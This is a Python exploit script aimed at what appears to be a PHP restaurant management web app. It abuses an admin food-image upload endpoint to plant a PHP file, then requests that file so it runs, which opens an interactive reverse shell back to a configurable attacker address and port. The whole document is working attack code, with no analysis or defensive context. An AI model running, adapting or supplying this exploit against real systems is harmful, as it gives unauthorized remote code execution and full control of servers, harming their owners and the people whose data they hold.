import requests

# configure
LHOST = '10.4.30.255' 
LPORT = '6969'
RHOST = '10.10.29.82' # ip of target without port

# don't touch for basic use
RPORT = '12340'
FILENAME = 'exploit.php'
UPLOAD_ENDPOINT = '/rms/admin/foods-exec.php'
RS_ENDPOINT = '/rms/images/{}'
PAYLOAD = '''<?php 
    $sock=fsockopen("{}",{});
    $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>'''

def populate_payload(ip: str, port: str) -> str:
    return PAYLOAD.format(ip, port)

def build_endpoint(host: str, port: str, endpoint: str) -> str:
    return f'http://{host}:{port}{endpoint}'

def main() -> None:

    # Build target url
    target = build_endpoint(RHOST, RPORT, UPLOAD_ENDPOINT)

    # Build multipart form data
    files= {
        'photo': ( FILENAME, populate_payload(LHOST, LPORT).encode(), 'text/html' ),
        'submit': 'Add'
    }

    # Post payload - prevent redirect to admin page to preseve request success / failure messaging
    requests.post(target, allow_redirects=False, files=files)

    # Navigate to reverse shell
    requests.get(build_endpoint(RHOST, RPORT, RS_ENDPOINT.format(FILENAME)))

if __name__ == '__main__':
    main()